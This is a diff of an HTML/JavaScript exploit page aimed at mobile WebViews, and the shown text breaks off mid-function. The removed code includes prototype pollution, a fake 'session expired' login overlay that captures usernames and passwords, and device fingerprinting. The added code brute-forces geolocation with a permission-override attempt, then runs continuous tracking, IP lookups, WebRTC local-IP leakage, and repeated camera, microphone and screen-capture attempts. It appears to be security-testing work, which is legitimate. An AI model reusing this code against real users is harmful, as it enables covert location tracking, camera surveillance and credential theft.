@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebView Exploitation PoC</title>
+    <title>Aggressive Location & Camera Exploit</title>
     <meta charset="utf-8">
     <style>
         body {
             font-family: 'Courier New', monospace;
-            padding: 15px;
+            padding: 10px;
             background: #000;
             color: #00ff00;
             margin: 0;
-            font-size: 11px;
+            font-size: 10px;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
             background: rgba(0,20,0,0.9);
             padding: 15px;
@@ -22,552 +22,602 @@
         }
         .section {
             background: rgba(0,40,0,0.3);
-            padding: 12px;
+            padding: 10px;
             margin: 8px 0;
             border-radius: 4px;
             border-left: 3px solid #ff0000;
         }
-        .success { border-left-color: #00ff00; }
-        .warning { border-left-color: #ffff00; }
-        .info { border-left-color: #0099ff; }
         .critical { border-left-color: #ff0000; }
+        .warning { border-left-color: #ffff00; }
+        .success { border-left-color: #00ff00; }
         button {
             background: #004400;
             color: #00ff00;
             border: 1px solid #00ff00;
-            padding: 6px 12px;
+            padding: 4px 8px;
             border-radius: 3px;
             cursor: pointer;
             margin: 2px;
             font-family: inherit;
-            font-size: 10px;
+            font-size: 9px;
         }
         button:hover { background: #006600; }
-        .log-output {
+        .log {
             background: #001100;
-            padding: 10px;
+            padding: 8px;
             border-radius: 3px;
             font-family: inherit;
             margin: 5px 0;
-            font-size: 10px;
+            font-size: 9px;
             white-space: pre-wrap;
-            max-height: 200px;
+            max-height: 150px;
             overflow-y: auto;
             border: 1px solid #003300;
         }
         .exploit { color: #ff4444; font-weight: bold; }
-        .found { color: #ffff00; }
         .data { color: #44ffff; }
         .success-text { color: #44ff44; }
+        .warning-text { color: #ffff00; }
+        #videoPreview { width: 200px; height: 150px; background: #333; margin: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>[+] WebView Exploitation PoC</h1>
-        <p style="color: #ffff00;">[!] Demonstrating silent user harm via prototype pollution + media access</p>
+        <h1>[!] AGGRESSIVE LOCATION & CAMERA EXPLOIT</h1>
         
         <div class="section critical">
-            <h2>[!] Core Exploits</h2>
-            <button onclick="executePrototypePollution()">Prototype Pollution</button>
-            <button onclick="attemptMediaAccess()">Force Media Access</button>
-            <button onclick="attemptLocationAccess()">Force Location Access</button>
-            <button onclick="createPhishingOverlay()">Phishing Overlay</button>
+            <h2>[!] Location Extraction Vectors</h2>
+            <button onclick="bruteForceLocation()">Brute Force Location</button>
+            <button onclick="tryIPGeolocation()">IP Geolocation</button>
+            <button onclick="tryWiFiGeolocation()">WiFi Geolocation</button>
+            <button onclick="tryTimeZoneLocation()">TimeZone Location</button>
+            <button onclick="tryNetworkLocation()">Network Location</button>
+            <div id="locationLog" class="log"></div>
         </div>
 
         <div class="section warning">
-            <h2>[*] Permission Bypass Attempts</h2>
-            <button onclick="tryPermissionBypass()">Try Permission Bypass</button>
-            <button onclick="testDeviceAPIs()">Test Device APIs</button>
-            <button onclick="testWebViewBridges()">Test WebView Bridges</button>
-        </div>
-
-        <div class="section info">
-            <h2>[+] Exploitation Log</h2>
-            <div id="exploitLog" class="log-output"></div>
+            <h2>[!] Camera Access Vectors</h2>
+            <button onclick="bruteForcCamera()">Brute Force Camera</button>
+            <button onclick="tryLegacyCamera()">Legacy Camera APIs</button>
+            <button onclick="tryImageCapture()">Image Capture API</button>
+            <button onclick="tryWebRTC()">WebRTC Camera</button>
+            <button onclick="tryGetDisplayMedia()">Screen Capture</button>
+            <video id="videoPreview" autoplay muted></video>
+            <div id="cameraLog" class="log"></div>
         </div>
 
         <div class="section success">
-            <h2>[+] Extracted Data</h2>
-            <div id="extractedData" class="log-output"></div>
+            <h2>[+] Extracted Location Data</h2>
+            <div id="locationData" class="log"></div>
+        </div>
+
+        <div class="section success">
+            <h2>[+] Camera/Media Results</h2>
+            <div id="mediaResults" class="log"></div>
         </div>
     </div>
 
     <script>
-        let logDiv = document.getElementById('exploitLog');
-        let dataDiv = document.getElementById('extractedData');
-        let stolenData = {};
+        let locationLog = document.getElementById('locationLog');
+        let cameraLog = document.getElementById('cameraLog');
+        let locationData = document.getElementById('locationData');
+        let mediaResults = document.getElementById('mediaResults');
+        let activeStream = null;
 
-        function log(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString();
-            const colors = {
-                'info': '#00ff00',
-                'warning': '#ffff00', 
-                'error': '#ff0000',
-                'success': '#44ff44',
-                'data': '#44ffff',
-                'exploit': '#ff4444'
-            };
-            
-            const color = colors[type] || '#00ff00';
-            logDiv.innerHTML += `<span style="color: ${color}">[${timestamp}] ${message}</span>\n`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+        function logLocation(message, type = 'info') {
+            const colors = { 'info': '#00ff00', 'warning': '#ffff00', 'error': '#ff0000', 'success': '#44ff44', 'data': '#44ffff' };
+            locationLog.innerHTML += `<span style="color: ${colors[type]}">[${new Date().toLocaleTimeString()}] ${message}</span>\n`;
+            locationLog.scrollTop = locationLog.scrollHeight;
             console.log(message);
         }
 
-        function logData(key, value) {
-            stolenData[key] = value;
-            dataDiv.innerHTML += `<span style="color: #44ffff">[${key}]: ${JSON.stringify(value)}</span>\n`;
-            dataDiv.scrollTop = dataDiv.scrollHeight;
+        function logCamera(message, type = 'info') {
+            const colors = { 'info': '#00ff00', 'warning': '#ffff00', 'error': '#ff0000', 'success': '#44ff44', 'data': '#44ffff' };
+            cameraLog.innerHTML += `<span style="color: ${colors[type]}">[${new Date().toLocaleTimeString()}] ${message}</span>\n`;
+            cameraLog.scrollTop = cameraLog.scrollHeight;
+            console.log(message);
         }
 
-        function executePrototypePollution() {
-            log('[+] Executing prototype pollution attack...', 'exploit');
-            
-            try {
-                // Test basic pollution
-                Object.prototype.isAdmin = true;
-                Object.prototype.authenticated = true;
-                Object.prototype.permissions = ['camera', 'microphone', 'location'];
-                Object.prototype.securityDisabled = true;
-                Object.prototype.bypassChecks = true;
-                
-                // Test if pollution worked
-                const testObj = {};
-                if (testObj.isAdmin) {
-                    log('[!] SUCCESS: Prototype pollution active!', 'success');
-                    logData('prototype_pollution', 'SUCCESS - All objects now have malicious properties');
-                    
-                    // Try to override security functions
-                    Object.prototype.checkPermission = function() { return true; };
-                    Object.prototype.isSecure = function() { return false; };
-                    Object.prototype.validateInput = function() { return true; };
-                    
-                    log('[!] Security function overrides installed', 'exploit');
-                } else {
-                    log('[!] FAILED: Prototype pollution blocked', 'error');
-                }
-                
-            } catch (e) {
-                log(`[!] Prototype pollution error: ${e.message}`, 'error');
-            }
+        function displayLocationData(data) {
+            locationData.innerHTML += `<span style="color: #44ffff">${JSON.stringify(data, null, 2)}</span>\n`;
+            locationData.scrollTop = locationData.scrollHeight;
         }
 
-        function attemptMediaAccess() {
-            log('[+] Attempting camera/microphone access...', 'warning');
+        function displayMediaData(data) {
+            mediaResults.innerHTML += `<span style="color: #44ffff">${JSON.stringify(data, null, 2)}</span>\n`;
+            mediaResults.scrollTop = mediaResults.scrollHeight;
+        }
+
+        async function bruteForceLocation() {
+            logLocation('[!] STARTING AGGRESSIVE LOCATION EXTRACTION...', 'error');
             
-            // Try multiple approaches for media access
-            const strategies = [
-                // Strategy 1: Standard getUserMedia
-                () => {
-                    return navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user' },
-                        audio: true
-                    });
-                },
-                // Strategy 2: Legacy getUserMedia
-                () => {
-                    const getUserMedia = navigator.getUserMedia || 
-                                       navigator.webkitGetUserMedia || 
-                                       navigator.mozGetUserMedia;
-                    if (getUserMedia) {
-                        return new Promise((resolve, reject) => {
-                            getUserMedia.call(navigator, {video: true, audio: true}, resolve, reject);
-                        });
-                    }
-                    throw new Error('Legacy getUserMedia not available');
-                },
-                // Strategy 3: Try without audio first
-                () => {
-                    return navigator.mediaDevices.getUserMedia({video: true});
-                },
-                // Strategy 4: Try audio only
-                () => {
-                    return navigator.mediaDevices.getUserMedia({audio: true});
-                }
+            // Strategy 1: Multiple geolocation attempts with different options
+            const geoOptions = [
+                { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 },
+                { enableHighAccuracy: false, timeout: 2000, maximumAge: 0 },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 300000 },
+                { enableHighAccuracy: false, timeout: 10000, maximumAge: 600000 },
+                { timeout: 15000, maximumAge: Infinity },
+                { maximumAge: Infinity, timeout: 0 }, // Cached only
+                {} // Default
             ];
 
-            let strategyIndex = 0;
-            
-            function tryNextStrategy() {
-                if (strategyIndex >= strategies.length) {
-                    log('[!] All media access strategies failed', 'error');
-                    logData('media_access', 'DENIED - WebView blocks media access');
+            for (let i = 0; i < geoOptions.length; i++) {
+                logLocation(`[+] Geo attempt ${i+1}: ${JSON.stringify(geoOptions[i])}`, 'info');
+                
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions[i]);
+                    });
                     
-                    // Try to detect why it failed
-                    detectMediaBlockage();
+                    logLocation(`[!] SUCCESS! Location obtained via strategy ${i+1}`, 'success');
+                    const locationInfo = {
+                        strategy: i+1,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    };
+                    
+                    displayLocationData(locationInfo);
+                    logLocation(`[!] COORDINATES: ${position.coords.latitude}, ${position.coords.longitude}`, 'data');
+                    logLocation(`[!] ACCURACY: ${position.coords.accuracy}m`, 'data');
+                    
+                    // Start continuous tracking
+                    startLocationTracking(geoOptions[i]);
                     return;
+                    
+                } catch (error) {
+                    logLocation(`[!] Strategy ${i+1} failed: ${error.message} (Code: ${error.code})`, 'warning');
                 }
                 
-                const strategy = strategies[strategyIndex++];
-                log(`[+] Trying media strategy ${strategyIndex}...`, 'info');
-                
-                strategy()
-                    .then(stream => {
-                        log('[!] CRITICAL: Media access granted!', 'exploit');
-                        logData('media_stream', {
-                            video_tracks: stream.getVideoTracks().length,
-                            audio_tracks: stream.getAudioTracks().length,
-                            active: stream.active
-                        });
-                        
-                        // Simulate recording
-                        setTimeout(() => {
-                            log('[!] Simulating 5-second recording...', 'exploit');
-                            logData('recording_simulation', 'User unknowingly recorded for 5 seconds');
-                            
-                            // Stop all tracks
-                            stream.getTracks().forEach(track => {
-                                track.stop();
-                                log(`[+] Stopped ${track.kind} track`, 'info');
-                            });
-                        }, 5000);
-                    })
-                    .catch(error => {
-                        log(`[!] Strategy ${strategyIndex} failed: ${error.message}`, 'warning');
-                        tryNextStrategy();
-                    });
+                // Small delay between attempts
+                await new Promise(resolve => setTimeout(resolve, 500));
             }
             
-            tryNextStrategy();
+            logLocation('[!] All direct geolocation attempts failed', 'error');
+            
+            // Strategy 2: Try permission manipulation
+            await tryPermissionManipulation();
         }
 
-        function detectMediaBlockage() {
-            log('[+] Analyzing media access blockage...', 'info');
+        async function tryPermissionManipulation() {
+            logLocation('[+] Attempting permission manipulation...', 'warning');
             
-            // Check what's available
-            if (!navigator.mediaDevices) {
-                log('[!] mediaDevices API completely unavailable', 'error');
-                logData('media_blockage', 'mediaDevices API not exposed to WebView');
-                return;
-            }
-            
-            if (!navigator.mediaDevices.getUserMedia) {
-                log('[!] getUserMedia function not available', 'error');
-                logData('media_blockage', 'getUserMedia not exposed to WebView');
-                return;
-            }
-            
-            // Check permissions API
+            // Try to override permission state
             if (navigator.permissions) {
-                navigator.permissions.query({name: 'camera'})
-                    .then(permission => {
-                        log(`[+] Camera permission state: ${permission.state}`, 'info');
-                        logData('camera_permission', permission.state);
-                    })
-                    .catch(e => {
-                        log('[!] Cannot query camera permission', 'warning');
+                try {
+                    const permission = await navigator.permissions.query({name: 'geolocation'});
+                    logLocation(`[+] Current geolocation permission: ${permission.state}`, 'info');
+                    
+                    // Try to force grant permission using prototype pollution
+                    Object.defineProperty(permission, 'state', {
+                        value: 'granted',
+                        writable: true
                     });
                     
-                navigator.permissions.query({name: 'microphone'})
-                    .then(permission => {
-                        log(`[+] Microphone permission state: ${permission.state}`, 'info');
-                        logData('microphone_permission', permission.state);
-                    })
-                    .catch(e => {
-                        log('[!] Cannot query microphone permission', 'warning');
-                    });
-            } else {
-                log('[!] Permissions API not available', 'warning');
-                logData('permissions_api', 'Not available in WebView');
+                    logLocation(`[+] Attempted to override permission to: ${permission.state}`, 'warning');
+                    
+                    // Try geolocation again after manipulation
+                    setTimeout(() => {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                logLocation('[!] SUCCESS after permission manipulation!', 'success');
+                                displayLocationData({
+                                    method: 'permission_manipulation',
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy
+                                });
+                            },
+                            error => {
+                                logLocation(`[!] Still denied after manipulation: ${error.message}`, 'error');
+                            }
+                        );
+                    }, 1000);
+                    
+                } catch (e) {
+                    logLocation(`[!] Permission query failed: ${e.message}`, 'error');
+                }
             }
         }
 
-        function attemptLocationAccess() {
-            log('[+] Attempting location access...', 'warning');
+        function startLocationTracking(options) {
+            logLocation('[+] Starting continuous location tracking...', 'warning');
             
-            if (!navigator.geolocation) {
-                log('[!] Geolocation API not available', 'error');
-                logData('geolocation', 'API not available');
-                return;
-            }
+            const watchId = navigator.geolocation.watchPosition(
+                position => {
+                    logLocation(`[!] TRACKING UPDATE: ${position.coords.latitude}, ${position.coords.longitude}`, 'data');
+                    displayLocationData({
+                        type: 'tracking_update',
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    });
+                },
+                error => {
+                    logLocation(`[!] Tracking error: ${error.message}`, 'warning');
+                },
+                options
+            );
             
-            // Try multiple geolocation strategies
-            const options = [
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 },
-                { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 },
-                { timeout: 15000 } // Minimal options
+            // Stop tracking after 60 seconds
+            setTimeout(() => {
+                navigator.geolocation.clearWatch(watchId);
+                logLocation('[+] Stopped location tracking', 'info');
+            }, 60000);
+        }
+
+        async function tryIPGeolocation() {
+            logLocation('[+] Attempting IP-based geolocation...', 'info');
+            
+            const ipServices = [
+                'https://ipapi.co/json/',
+                'https://api.ipify.org?format=json',
+                'https://httpbin.org/ip',
+                'https://api.myip.com',
+                'https://ipinfo.io/json'
             ];
             
-            let optionIndex = 0;
-            
-            function tryLocationAccess() {
-                if (optionIndex >= options.length) {
-                    log('[!] All location access attempts failed', 'error');
+            for (const service of ipServices) {
+                try {
+                    logLocation(`[+] Trying ${service}...`, 'info');
+                    const response = await fetch(service);
+                    const data = await response.json();
                     
-                    // Try to get cached position
-                    log('[+] Attempting to get cached position...', 'info');
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            log('[!] CRITICAL: Cached location obtained!', 'exploit');
-                            logLocationData(position);
-                        },
-                        error => {
-                            log(`[!] Even cached location denied: ${error.message}`, 'error');
-                            logData('location_access', `DENIED: ${error.message}`);
-                            analyzeLocationBlockage(error);
-                        },
-                        { maximumAge: Infinity, timeout: 0 }
-                    );
-                    return;
-                }
-                
-                const option = options[optionIndex++];
-                log(`[+] Trying location strategy ${optionIndex}...`, 'info');
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        log('[!] CRITICAL: Location access granted!', 'exploit');
-                        logLocationData(position);
-                        
-                        // Start watching position
-                        log('[+] Starting position tracking...', 'exploit');
-                        const watchId = navigator.geolocation.watchPosition(
-                            pos => {
-                                log(`[!] Position update: ${pos.coords.latitude}, ${pos.coords.longitude}`, 'data');
-                            },
-                            err => {
-                                log(`[!] Watch position error: ${err.message}`, 'warning');
-                            },
-                            option
-                        );
-                        
-                        // Stop tracking after 30 seconds
-                        setTimeout(() => {
-                            navigator.geolocation.clearWatch(watchId);
-                            log('[+] Stopped position tracking', 'info');
-                        }, 30000);
-                    },
-                    error => {
-                        log(`[!] Strategy ${optionIndex} failed: ${error.message}`, 'warning');
-                        setTimeout(tryLocationAccess, 1000);
-                    },
-                    option
-                );
-            }
-            
-            tryLocationAccess();
-        }
-
-        function logLocationData(position) {
-            const locationData = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                heading: position.coords.heading,
-                speed: position.coords.speed,
-                timestamp: new Date(position.timestamp).toISOString()
-            };
-            
-            logData('location_data', locationData);
-            log(`[!] Coordinates: ${locationData.latitude}, ${locationData.longitude}`, 'data');
-            log(`[!] Accuracy: ${locationData.accuracy}m`, 'data');
-        }
-
-        function analyzeLocationBlockage(error) {
-            log('[+] Analyzing location access blockage...', 'info');
-            
-            const errorMessages = {
-                1: 'PERMISSION_DENIED - User or system denied location access',
-                2: 'POSITION_UNAVAILABLE - Network or satellite failure',
-                3: 'TIMEOUT - Location request timed out'
-            };
-            
-            log(`[!] Error code ${error.code}: ${errorMessages[error.code] || 'Unknown error'}`, 'error');
-            logData('location_error', {
-                code: error.code,
-                message: error.message,
-                description: errorMessages[error.code]
-            });
-        }
-
-        function tryPermissionBypass() {
-            log('[+] Attempting permission bypass techniques...', 'exploit');
-            
-            // Try to override permission checks using prototype pollution
-            if (window.Notification) {
-                Object.prototype.permission = 'granted';
-                log(`[+] Notification permission: ${Notification.permission}`, 'info');
-            }
-            
-            // Try to access device information
-            if (navigator.deviceMemory) {
-                log(`[+] Device memory: ${navigator.deviceMemory}GB`, 'data');
-                logData('device_memory', navigator.deviceMemory);
-            }
-            
-            if (navigator.hardwareConcurrency) {
-                log(`[+] CPU cores: ${navigator.hardwareConcurrency}`, 'data');
-                logData('cpu_cores', navigator.hardwareConcurrency);
-            }
-            
-            // Try to access battery info
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    log(`[!] Battery level: ${Math.round(battery.level * 100)}%`, 'data');
-                    logData('battery_info', {
-                        level: battery.level,
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
+                    logLocation(`[!] IP service response received`, 'success');
+                    displayLocationData({
+                        method: 'ip_geolocation',
+                        service: service,
+                        data: data
                     });
-                }).catch(e => {
-                    log('[!] Battery API blocked', 'warning');
-                });
+                    
+                    if (data.latitude && data.longitude) {
+                        logLocation(`[!] LOCATION FROM IP: ${data.latitude}, ${data.longitude}`, 'data');
+                    }
+                    
+                } catch (error) {
+                    logLocation(`[!] ${service} failed: ${error.message}`, 'warning');
+                }
             }
         }
 
-        function testDeviceAPIs() {
-            log('[+] Testing device APIs...', 'info');
+        async function tryWiFiGeolocation() {
+            logLocation('[+] Attempting WiFi-based location...', 'info');
             
-            // Screen information
-            logData('screen_info', {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                orientation: screen.orientation ? screen.orientation.type : 'unknown'
-            });
-            
-            // Network information
+            // Try to get network information
             if (navigator.connection) {
-                logData('network_info', {
+                const networkInfo = {
                     effectiveType: navigator.connection.effectiveType,
                     downlink: navigator.connection.downlink,
                     rtt: navigator.connection.rtt,
                     saveData: navigator.connection.saveData
+                };
+                
+                logLocation('[+] Network info obtained', 'info');
+                displayLocationData({
+                    method: 'network_analysis',
+                    network: networkInfo
                 });
             }
             
-            // Device orientation
-            if (window.DeviceOrientationEvent) {
-                log('[+] Device orientation available', 'warning');
-                window.addEventListener('deviceorientation', (event) => {
-                    logData('device_orientation', {
-                        alpha: event.alpha,
-                        beta: event.beta,
-                        gamma: event.gamma
-                    });
-                }, { once: true });
-            }
-            
-            // Device motion
-            if (window.DeviceMotionEvent) {
-                log('[+] Device motion available', 'warning');
-                window.addEventListener('devicemotion', (event) => {
-                    if (event.acceleration) {
-                        logData('device_motion', {
-                            x: event.acceleration.x,
-                            y: event.acceleration.y,
-                            z: event.acceleration.z
-                        });
+            // Try WebRTC to get local IPs
+            try {
+                const rtc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                const ips = [];
+                
+                rtc.createDataChannel('');
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                
+                rtc.onicecandidate = function(event) {
+                    if (event.candidate) {
+                        const candidate = event.candidate.candidate;
+                        const ip = candidate.split(' ')[4];
+                        if (ip && ips.indexOf(ip) === -1) {
+                            ips.push(ip);
+                            logLocation(`[+] Local IP discovered: ${ip}`, 'data');
+                            displayLocationData({
+                                method: 'webrtc_ip',
+                                ip: ip,
+                                candidate: candidate
+                            });
+                        }
                     }
-                }, { once: true });
+                };
+                
+            } catch (error) {
+                logLocation(`[!] WebRTC IP discovery failed: ${error.message}`, 'warning');
             }
         }
 
-        function testWebViewBridges() {
-            log('[+] Testing for WebView bridges...', 'info');
+        function tryTimeZoneLocation() {
+            logLocation('[+] Extracting timezone-based location...', 'info');
             
-            // Look for common WebView interfaces
-            const interfaces = ['Android', 'webkit', 'app', 'bridge', 'nativeApp', 'CTF'];
+            const timezoneData = {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                offset: new Date().getTimezoneOffset(),
+                locale: navigator.language,
+                languages: navigator.languages
+            };
             
-            interfaces.forEach(name => {
-                if (window[name]) {
-                    log(`[!] FOUND INTERFACE: ${name}`, 'exploit');
-                    logData(`interface_${name}`, typeof window[name]);
-                    
-                    if (typeof window[name] === 'object') {
-                        const methods = Object.getOwnPropertyNames(window[name]);
-                        log(`[+] ${name} methods: ${methods.join(', ')}`, 'data');
-                        logData(`${name}_methods`, methods);
-                    }
-                }
+            logLocation(`[+] Timezone: ${timezoneData.timezone}`, 'data');
+            logLocation(`[+] UTC Offset: ${timezoneData.offset} minutes`, 'data');
+            
+            displayLocationData({
+                method: 'timezone_analysis',
+                ...timezoneData
             });
         }
 
-        function createPhishingOverlay() {
-            log('[+] Creating phishing overlay...', 'exploit');
+        async function tryNetworkLocation() {
+            logLocation('[+] Attempting network-based location discovery...', 'info');
             
-            // Use prototype pollution to bypass security
-            Object.prototype.trusted = true;
-            Object.prototype.verified = true;
+            // Try to measure latency to different servers to triangulate location
+            const servers = [
+                'https://www.google.com/favicon.ico',
+                'https://www.amazon.com/favicon.ico',
+                'https://www.microsoft.com/favicon.ico',
+                'https://www.apple.com/favicon.ico'
+            ];
             
-            const overlay = document.createElement('div');
-            overlay.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(255,255,255,0.95);
-                z-index: 9999;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                font-family: Arial, sans-serif;
-                color: #333;
-            `;
+            const latencies = {};
             
-            overlay.innerHTML = `
-                <div style="background: white; padding: 30px; border-radius: 10px; 
-                           box-shadow: 0 4px 20px rgba(0,0,0,0.3); text-align: center;">
-                    <h2 style="color: #d9534f;">Security Alert</h2>
-                    <p>Your session has expired. Please re-enter your credentials to continue.</p>
-                    <input type="text" placeholder="Username" style="width: 200px; padding: 10px; margin: 5px; border: 1px solid #ccc;">
-                    <br>
-                    <input type="password" placeholder="Password" style="width: 200px; padding: 10px; margin: 5px; border: 1px solid #ccc;">
-                    <br>
-                    <button onclick="captureCredentials(this)" style="background: #5cb85c; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin: 10px;">
-                        Continue
-                    </button>
-                    <button onclick="dismissOverlay(this)" style="background: #d9534f; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin: 10px;">
-                        Cancel
-                    </button>
-                </div>
-            `;
-            
-            document.body.appendChild(overlay);
-            log('[!] CRITICAL: Phishing overlay displayed to user!', 'exploit');
-            logData('phishing_overlay', 'Fake login form displayed - user may enter credentials');
-        }
-
-        function captureCredentials(button) {
-            const overlay = button.closest('div').parentElement.parentElement;
-            const inputs = overlay.querySelectorAll('input');
-            const username = inputs[0].value;
-            const password = inputs[1].value;
-            
-            if (username && password) {
-                log(`[!] CRITICAL: Credentials captured - ${username}:${password}`, 'exploit');
-                logData('stolen_credentials', { username, password, timestamp: new Date().toISOString() });
+            for (const server of servers) {
+                try {
+                    const start = performance.now();
+                    await fetch(server, {mode: 'no-cors'});
+                    const latency = performance.now() - start;
+                    
+                    const domain = new URL(server).hostname;
+                    latencies[domain] = latency;
+                    logLocation(`[+] Latency to ${domain}: ${latency.toFixed(2)}ms`, 'data');
+                    
+                } catch (error) {
+                    logLocation(`[!] Failed to ping ${server}`, 'warning');
+                }
             }
             
-            overlay.remove();
+            displayLocationData({
+                method: 'network_latency',
+                latencies: latencies
+            });
         }
 
-        function dismissOverlay(button) {
-            const overlay = button.closest('div').parentElement.parentElement;
-            overlay.remove();
-            log('[+] User dismissed phishing overlay', 'info');
+        async function bruteForcCamera() {
+            logCamera('[!] STARTING AGGRESSIVE CAMERA ACCESS...', 'error');
+            
+            // Strategy 1: Multiple getUserMedia configurations
+            const mediaConfigs = [
+                { video: true, audio: true },
+                { video: { facingMode: 'user' }, audio: true },
+                { video: { facingMode: 'environment' }, audio: true },
+                { video: { width: 640, height: 480 } },
+                { video: { width: 1280, height: 720 } },
+                { video: { deviceId: 'default' } },
+                { video: true },
+                { audio: true },
+                { video: { facingMode: { exact: 'user' } } },
+                { video: { facingMode: { exact: 'environment' } } },
+                { video: { mandatory: { minWidth: 640, minHeight: 480 } } }, // Legacy
+            ];
+
+            for (let i = 0; i < mediaConfigs.length; i++) {
+                logCamera(`[+] Camera attempt ${i+1}: ${JSON.stringify(mediaConfigs[i])}`, 'info');
+                
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(mediaConfigs[i]);
+                    
+                    logCamera(`[!] SUCCESS! Camera access granted via config ${i+1}`, 'success');
+                    
+                    // Display video
+                    const video = document.getElementById('videoPreview');
+                    video.srcObject = stream;
+                    
+                    const tracks = stream.getTracks();
+                    const mediaInfo = {
+                        config: i+1,
+                        videoTracks: tracks.filter(t => t.kind === 'video').length,
+                        audioTracks: tracks.filter(t => t.kind === 'audio').length,
+                        constraints: mediaConfigs[i]
+                    };
+                    
+                    tracks.forEach(track => {
+                        const settings = track.getSettings();
+                        logCamera(`[!] ${track.kind} track: ${settings.width}x${settings.height}`, 'data');
+                        mediaInfo[`${track.kind}_settings`] = settings;
+                    });
+                    
+                    displayMediaData(mediaInfo);
+                    
+                    // Keep stream active for analysis
+                    activeStream = stream;
+                    
+                    // Try to take a screenshot
+                    setTimeout(() => takeScreenshot(stream), 2000);
+                    
+                    return;
+                    
+                } catch (error) {
+                    logCamera(`[!] Config ${i+1} failed: ${error.message}`, 'warning');
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            logCamera('[!] All camera access attempts failed', 'error');
+        }
+
+        async function tryLegacyCamera() {
+            logCamera('[+] Trying legacy camera APIs...', 'info');
+            
+            // Legacy getUserMedia
+            const getUserMedia = navigator.getUserMedia || 
+                               navigator.webkitGetUserMedia || 
+                               navigator.mozGetUserMedia ||
+                               navigator.msGetUserMedia;
+            
+            if (getUserMedia) {
+                logCamera('[+] Legacy getUserMedia found', 'warning');
+                
+                const constraints = { video: true, audio: true };
+                
+                getUserMedia.call(navigator, constraints,
+                    function(stream) {
+                        logCamera('[!] SUCCESS via legacy getUserMedia!', 'success');
+                        document.getElementById('videoPreview').srcObject = stream;
+                        
+                        displayMediaData({
+                            method: 'legacy_getUserMedia',
+                            stream: stream.id,
+                            tracks: stream.getTracks().length
+                        });
+                        
+                        activeStream = stream;
+                    },
+                    function(error) {
+                        logCamera(`[!] Legacy getUserMedia failed: ${error.message}`, 'warning');
+                    }
+                );
+            } else {
+                logCamera('[!] No legacy getUserMedia available', 'error');
+            }
+        }
+
+        async function tryImageCapture() {
+            logCamera('[+] Trying ImageCapture API...', 'info');
+            
+            if (activeStream) {
+                try {
+                    const videoTrack = activeStream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(videoTrack);
+                    
+                    // Take photo
+                    const photo = await imageCapture.takePhoto();
+                    logCamera('[!] Photo captured successfully!', 'success');
+                    
+                    // Get photo capabilities
+                    const capabilities = await imageCapture.getPhotoCapabilities();
+                    logCamera(`[+] Photo capabilities: ${JSON.stringify(capabilities)}`, 'data');
+                    
+                    displayMediaData({
+                        method: 'image_capture',
+                        photo_size: photo.size,
+                        photo_type: photo.type,
+                        capabilities: capabilities
+                    });
+                    
+                } catch (error) {
+                    logCamera(`[!] ImageCapture failed: ${error.message}`, 'warning');
+                }
+            } else {
+                logCamera('[!] No active stream for ImageCapture', 'error');
+            }
+        }
+
+        async function tryWebRTC() {
+            logCamera('[+] Trying WebRTC camera access...', 'info');
+            
+            try {
+                const pc = new RTCPeerConnection();
+                
+                // Add a video track
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                stream.getTracks().forEach(track => {
+                    pc.addTrack(track, stream);
+                    logCamera(`[!] Added ${track.kind} track to WebRTC`, 'success');
+                });
+                
+                document.getElementById('videoPreview').srcObject = stream;
+                activeStream = stream;
+                
+                displayMediaData({
+                    method: 'webrtc_camera',
+                    tracks: stream.getTracks().length,
+                    stream_id: stream.id
+                });
+                
+            } catch (error) {
+                logCamera(`[!] WebRTC camera failed: ${error.message}`, 'warning');
+            }
+        }
+
+        async function tryGetDisplayMedia() {
+            logCamera('[+] Trying screen capture...', 'info');
+            
+            if (navigator.mediaDevices.getDisplayMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+                    
+                    logCamera('[!] Screen capture successful!', 'success');
+                    document.getElementById('videoPreview').srcObject = stream;
+                    
+                    displayMediaData({
+                        method: 'screen_capture',
+                        tracks: stream.getTracks().length,
+                        stream_id: stream.id
+                    });
+                    
+                    activeStream = stream;
+                    
+                } catch (error) {
